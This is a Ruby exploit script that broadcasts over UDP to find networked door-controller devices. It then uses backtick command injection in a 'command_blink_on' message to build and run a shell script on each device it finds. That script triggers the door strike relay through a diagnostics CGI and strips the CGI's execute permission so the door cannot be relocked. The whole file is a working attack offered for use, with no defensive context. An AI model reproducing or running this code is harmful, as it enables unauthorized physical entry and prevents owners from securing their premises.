#!/usr/bin/env ruby
require 'socket'
require 'timeout'

timeout = 3
iface = nil

BROADCAST_ADDR = "255.255.255.255"
BIND_ADDR = "0.0.0.0"
PORT = 4070

# socket setup
socket = UDPSocket.new
socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_BROADCAST, true)
socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_BINDTODEVICE, iface) if iface
socket.bind(BIND_ADDR, PORT)

# find target and get its mac address
buffer = "discover;013;"
puts "sending discover request"
socket.send(buffer,0,BROADCAST_ADDR,PORT)

puts "waiting #{timeout} second#{"s" if timeout > 1} for responses..."
puts ""

targets = {}
while true
  begin
    Timeout::timeout(timeout) do
      resp, addr = socket.recvfrom(1024)
      if resp && resp =~ /^discovered/
        targets[addr.last] = resp.split(";")[2]
      end
    end
  rescue Timeout::Error, Interrupt
    break
  end
end

puts "done"
puts "unlocking #{targets.length} target#{"s" if targets.length > 1}"

# send a sequence of commands to unlock the target
if targets.length > 0
  commands = [
    "export QUERY_STRING=\"?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=1\"",  # set QUERY_STRING to values for unlocking target strike
    "/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",                                     # call diagnostics_execute.cgi script
    "chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi"                             # prevent relocking by removing exec perms
  ]

  targets.each_pair {|ip,mac|
    # have to split commands and exec from a tmp script because of length limit
    commands.join("\n").scan(/.{1,22}/m).each {|piece|
      cmd = "command_blink_on;"
      payload = "#{mac};1`printf '#{piece}' >> /tmp/a`;" # here be dragons
      buffer = "#{cmd}%03d;#{payload}" % (cmd.length + payload.length + 4)

      socket.send(buffer,0,ip,PORT)
      sleep(1)
    }
    cmd = "command_blink_on;"
    payload = "#{mac};1`chmod +x /tmp/a`;"
    buffer = "#{cmd}%03d;#{payload}" % (cmd.length + payload.length + 4)

    socket.send(buffer,0,ip,PORT)
    sleep(1)

    # execute tmp script
    cmd = "command_blink_on;"
    payload = "#{mac};1`/tmp/a`;"
    buffer = "#{cmd}%03d;#{payload}" % (cmd.length + payload.length + 4)

    socket.send(buffer,0,ip,PORT)
  }
end

# socket teardown
socket.close

puts "here, let me get that door for you :)"
